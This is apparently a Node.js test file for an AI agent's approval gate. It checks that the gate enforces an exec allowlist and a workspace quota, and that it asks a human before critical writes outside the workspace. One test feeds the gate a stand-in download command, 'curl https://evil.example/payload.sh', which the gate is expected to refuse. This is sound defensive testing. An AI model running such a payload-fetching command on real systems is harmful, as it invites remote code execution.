/**
 * The approval GATE's own refusals (src/security/approvals.mjs).
 *
 * Batches A–E swept the CALLER (src/agent/loop.mjs). This instalment swept the
 * thing it calls: 12 probes replaced one enforcement line each in
 * authorizeInner/needsApproval and ran the full suite (2026-08-25, 3042 tests).
 * Nine came back red. Three were green — the gate could refuse nothing and no
 * test would notice:
 *
 *     AI: if (false && !isExecCommandAllowed(name, args)) { ...exec_not_allowlisted }
 *     AJ: if (false && q && q.ok === false)               { ...WORKSPACE_QUOTA_EXCEEDED }
 *     AQ: if (false && critical) return true;             (novel danger still asks)
 *
 * All three had the same shape as the loop-stage blind spots: the PURE half is
 * exhaustively covered and the CALL SITE is not.
 *
 *  - commandMatchesExecAllowlist has its own suite (test/exec-allowlist.test.mjs)
 *    and exactly one call site in the product — approvals.mjs:210, reached only
 *    from the block above. No test anywhere sets security.execAllowlist /
 *    execPatterns (`grep -rln execAllowlist test/` → nothing), so the operator's
 *    exec allowlist was inert product-wide and the suite stayed green.
 *  - authorizeQuotaPreflight has four dedicated test files, every one of which
 *    imports it directly and never builds a gate. It too has exactly one call
 *    site, and src/security/workspace-quota.mjs is consumed only through it — so
 *    with the refusal gone the whole quota subsystem measures and reports and
 *    then nothing happens.
 *  - `if (critical) return true;` is the entire default-policy defence for
 *    non-exec critical actions: security.requireApproval defaults to EXEC_TOOLS
 *    (bash/shell/exec/…) with no file tools in it, so line 302 says "auto" for a
 *    file_write no matter how dangerous. Line 292 is the only reason a
 *    critical-tier write pends under the shipped default — precisely the
 *    live-fired v3.126.0 security behaviour (an outside-workspace write that
 *    used to auto-run with no record).
 *
 * Both directions, one field apart. Each pair runs the SAME tool through the
 * SAME gate config and changes exactly one thing — the command, the byte
 * ceiling, the target path — because a negative case alone is satisfied by a
 * gate that refuses everything.
 *
 * Isolate the guard under test: AI and AJ set autoApprove + criticalOverride
 * "legacy" so the approval decision cannot become what stops the call (the trap
 * recorded in test/loop-guard-enforcement.test.mjs). AQ must do the opposite —
 * it IS the approval decision — so it runs the shipped defaults and asserts that
 * a human was ASKED, which is the only thing the mutant changes: under
 * `if (false && critical)` the same call comes back mode:"auto" with onPending
 * never fired.
 *
 * HOME/state are redirected to a temp dir so matchDecision cannot find a real
 * durable pin and journalDecision writes nowhere real.
 */
import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

const tmpHome = fs.mkdtempSync(path.join(os.tmpdir(), "xclaw-gate-enf-"));
const saved = {};

let createApprovalGate;
let _resetQuotaMeasureCache;

before(async () => {
  for (const k of ["HOME", "XCLAW_STATE_DIR", "XCLAW_CONFIG_DIR"]) saved[k] = process.env[k];
  process.env.HOME = tmpHome;
  process.env.XCLAW_STATE_DIR = tmpHome;
  process.env.XCLAW_CONFIG_DIR = tmpHome;
  ({ createApprovalGate } = await import("../src/security/approvals.mjs"));
  ({ _resetQuotaMeasureCache } = await import("../src/security/authorize-quota.mjs"));
});

after(() => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  fs.rmSync(tmpHome, { recursive: true, force: true });
});

function workspace(label) {
  return fs.realpathSync(fs.mkdtempSync(path.join(tmpHome, `${label}-`)));
}

describe("approval gate enforces the operator's exec allowlist", () => {
  /** Approvals off on purpose: the allowlist refusal must be what stops it. */
  function gateFor(work) {
    return createApprovalGate({
      paths: { configDir: work },
      security: {
        execAllowlist: ["ls*"],
        autoApprove: true,
        criticalOverride: "legacy",
        planRoot: work,
      },
    });
  }

  it("refuses an exec command the allowlist does not cover", async () => {
    const work = workspace("execdeny");
    const r = await gateFor(work).authorize("bash", {
      command: "curl https://evil.example/payload.sh",
      cwd: work,
    });

    assert.equal(r.ok, false, "an unlisted command must not be authorized");
    // This reason string exists at exactly one place in src/ — the block under
    // test — so it cannot be produced by any other refusal.
    assert.equal(r.reason, "exec_not_allowlisted");
    assert.match(String(r.message || ""), /exec allowlist/);
  });

  it("authorizes an exec command the allowlist covers", async () => {
    const work = workspace("execallow");
    // Same tool, same gate config, same cwd — only the command changes. Without
    // this the test above is satisfied by a gate that refuses every command.
    const r = await gateFor(work).authorize("bash", { command: "ls -la", cwd: work });

    assert.equal(r.ok, true, `a listed command must run (got: ${r.reason || ""})`);
    assert.equal(r.approved, true);
    assert.equal(r.mode, "auto");
  });
});

describe("approval gate enforces the workspace quota preflight", () => {
  /** measureTtlMs 0 = always measure fresh, so the memo cannot decide a case. */
  function gateFor(work, maxBytes) {
    return createApprovalGate({
      paths: { configDir: work },
      workspace: { quota: { enabled: true, maxBytes, maxFiles: 10_000, measureTtlMs: 0 } },
      security: { autoApprove: true, criticalOverride: "legacy", planRoot: work },
    });
  }

  /** A workspace already 64KB heavy before the write under test. */
  function heavyWorkspace(label) {
    const work = workspace(label);
    fs.writeFileSync(path.join(work, "ballast.bin"), Buffer.alloc(64 * 1024));
    return work;
  }

  const write = (work) => ({
    file_path: path.join(work, "note.txt"),
    content: "hello",
    cwd: work,
  });

  it("refuses a write that would exceed the byte ceiling", async () => {
    _resetQuotaMeasureCache();
    const work = heavyWorkspace("quotaover");
    const r = await gateFor(work, 4096).authorize("file_write", write(work), {
      riskWorkingDir: work,
    });

    assert.equal(r.ok, false, "a write over the hard cap must not be authorized");
    assert.equal(r.reason, "WORKSPACE_QUOTA_EXCEEDED");
    assert.match(String(r.message || ""), /quota exceeded/);
  });

  it("authorizes the same write under a ceiling it fits in", async () => {
    _resetQuotaMeasureCache();
    const work = heavyWorkspace("quotaunder");
    // Identical workspace, identical write, identical policy: only maxBytes
    // moves. A gate that refused every write would pass the case above alone.
    const r = await gateFor(work, 8 * 1024 * 1024).authorize("file_write", write(work), {
      riskWorkingDir: work,
    });

    assert.equal(r.ok, true, `a write under the cap must run (got: ${r.reason || ""})`);
    assert.equal(r.approved, true);
    assert.equal(r.mode, "auto");
  });
});

describe("approval gate asks a human about novel critical danger", () => {
  /**
   * Shipped defaults: no autoApprove, no autoApproveMaxTier, approvalPolicy
   * "risky", requireApproval = EXEC_TOOLS. file_write is on NO list here — the
   * critical tier is the whole reason it pends.
   */
  function gateFor(work) {
    return createApprovalGate({
      paths: { configDir: work },
      security: { planRoot: work },
    });
  }

  async function authorize(work, filePath) {
    const gate = gateFor(work);
    const asked = [];
    const r = await gate.authorize(
      "file_write",
      { file_path: filePath, content: "hello", cwd: work },
      {
        riskWorkingDir: work,
        timeoutMs: 5_000,
        onPending: (p) => {
          asked.push(p);
          // Deny so the case settles immediately instead of on the timer.
          Promise.resolve(gate.decide(p.id, false, "test denies")).catch(() => {});
        },
      }
    );
    return { r, asked };
  }

  it("pends a critical-tier write that no requireApproval list names", async () => {
    const work = workspace("critask");
    // Outside the workspace → assessRisk tier "critical" ("writes outside
    // workspace (home)"), while file_write is absent from every name list.
    const { r, asked } = await authorize(work, path.join(tmpHome, "outside-workspace.txt"));

    assert.equal(asked.length, 1, "a human must be asked — the mutant auto-approves silently");
    assert.equal(asked[0].risk?.tier, "critical");
    assert.equal(r.ok, false, "the operator denied it");
    assert.equal(r.reason, "denied");
    assert.ok(r.pendingId, "the answer must carry the ask it came from");
    // A deny is an ANSWER, not an open window: awaitingHuman is the "still
    // waiting" flag, and reading pendingId as pendency is the 3.180.0 bug.
    assert.equal(r.awaitingHuman, false);
  });

  it("auto-approves the same write inside the workspace", async () => {
    const work = workspace("critauto");
    // Same tool, same content, same gate: only the target path changes, which
    // drops the tier to "low". Without this the case above is satisfied by a
    // gate that asks about every write.
    const { r, asked } = await authorize(work, path.join(work, "note.txt"));

    assert.equal(asked.length, 0, "a low-tier in-workspace write must not ask");
    assert.equal(r.ok, true, `it must be authorized (got: ${r.reason || ""})`);
    assert.equal(r.mode, "auto");
    assert.equal(r.risk?.tier, "low");
  });
});
